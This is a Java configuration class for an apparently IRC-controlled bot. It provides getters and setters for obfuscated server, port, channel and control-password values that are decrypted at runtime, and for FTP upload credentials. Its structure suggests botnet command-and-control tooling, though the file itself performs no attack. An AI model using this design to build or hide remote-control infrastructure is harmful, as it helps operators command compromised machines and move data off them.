/**
 * Config class, returns needed values.
 * @author Nathan
 *
 */
public class Config
{
	/**
	 * Constructor
	 */
    public Config()
    {
    }
    /**
     * Returns the bot suffix
     * @return
     */
    public static String getSuffix()
    {
        return ConfigDeafaults.SUFFIX;
    }
    /**
     * Returns the bot prefix
     * @return
     */
    public static String getPrefix()
    {
        return ConfigDeafaults.PREFIX;
    }
    /**
     * Sets the bot suffix
     * @param set
     */
    public static void setSuffix(String set)
    {
        ConfigDeafaults.SUFFIX = set;
    }
    /**
     * Sets the bot prefix
     * @param set
     */
    public static void setPrefix(String set)
    {
        ConfigDeafaults.PREFIX = set;
    }
    /**
     * Sets weather the socket is being closed
     * @param set
     */
    public static void setIsClosing(boolean set)
    {
        isClosing = set;
    }
    /**
     * Returns if the socket is being closed
     * @return
     */
    public static boolean getIsClosing()
    {
        return isClosing;
    }
    /**
     * Returns the decrypted irc server
     * @return
     */
    public static String getConnect()
    {
        if(ConfigDeafaults.CONNECT.contains(" "))
            return Misc.decrypt(ConfigDeafaults.CONNECT);
        else
            return ConfigDeafaults.CONNECT;
    }
    /**
     * Returns the decrypted port
     * @return
     */
    public static String getPort()
    {
        if(ConfigDeafaults.PORT.contains(" "))
            return Misc.decrypt(ConfigDeafaults.PORT);
        else
            return ConfigDeafaults.PORT;
    }
    /**
     * Returns the Bots nick
     * @return
     */
    public static String getNick()
    {
        return (new StringBuilder(getPrefix())).append(ConfigDeafaults.NICK).append(getSuffix()).toString();
    }
    /**
     * Sets the bots nick
     * @param newNick
     */
    public static void setNick(String newNick)
    {
        ConfigDeafaults.NICK = (new StringBuilder(getPrefix())).append(newNick).append(getSuffix()).toString();
    }
    /**
     * Returns the decrypted channel for bots to join
     * @return
     */
    public static String getChannel()
    {
        if(ConfigDeafaults.CHANNEL.contains(" "))
            return Misc.decrypt(ConfigDeafaults.CHANNEL);
        else
            return ConfigDeafaults.CHANNEL;
    }
    /**
     * Returns the decrypted input channel
     * @return
     */
    public static String getInputChannel()
    {
        if(ConfigDeafaults.INPUT_CHANNEL.contains(" "))
            return Misc.decrypt(ConfigDeafaults.INPUT_CHANNEL);
        else
            return ConfigDeafaults.INPUT_CHANNEL;
    }
    /**
     * Returns the decrypted output channel
     * @return
     */
    public static String getOutputChannel()
    {
        if(ConfigDeafaults.OUTPUT_CHANNEL.contains(" "))
            return Misc.decrypt(ConfigDeafaults.OUTPUT_CHANNEL);
        else
            return ConfigDeafaults.OUTPUT_CHANNEL;
    }
    /**
     * Returns output channel password
     * @return
     */
    public static String getOutputChannelPassword()
    {
        if(ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD.contains(" "))
            return Misc.decrypt(ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD);
        else
            return ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD;
    }
    /**
     * Returns the input channel password
     * @return
     */
    public static String getInputChannelPassword()
    {
        if(ConfigDeafaults.INPUT_CHANNEL_PASSWORD.contains(" "))
            return Misc.decrypt(ConfigDeafaults.INPUT_CHANNEL_PASSWORD);
        else
            return ConfigDeafaults.INPUT_CHANNEL_PASSWORD;
    }
    /**
     * Returns the decrypted control password
     * @return
     */
    public static String getControlPassword()
    {
        if(ConfigDeafaults.CONTROL_PASSWORD.contains(" "))
            return Misc.decrypt(ConfigDeafaults.CONTROL_PASSWORD);
        else
            return ConfigDeafaults.CONTROL_PASSWORD;
    }
    /**
     * Gets the FTP username
     * @return
     */
    public static String getFtpUser() {
    	return ConfigDeafaults.FTP_USER;
    }
    /**
     * Gets the FTP password
     * @return
     */
    public static String getFtpPassword() {
    	return ConfigDeafaults.FTP_PASSWORD;
    }
    /**
     * Gets the FTP host
     * @return
     */
    public static String getFtpHost() {
    	return ConfigDeafaults.FTP_HOST;
    }
    /**
     * Gets the dir location to save
     * @return
     */
    public static String getDirLoc() {
    	return ConfigDeafaults.DIR_LOC;
    }
    /**
     * Gets the site
     * @return
     */
    public static String getSite() {
    	return ConfigDeafaults.SITE;
    }

    public static boolean isClosing = false;

}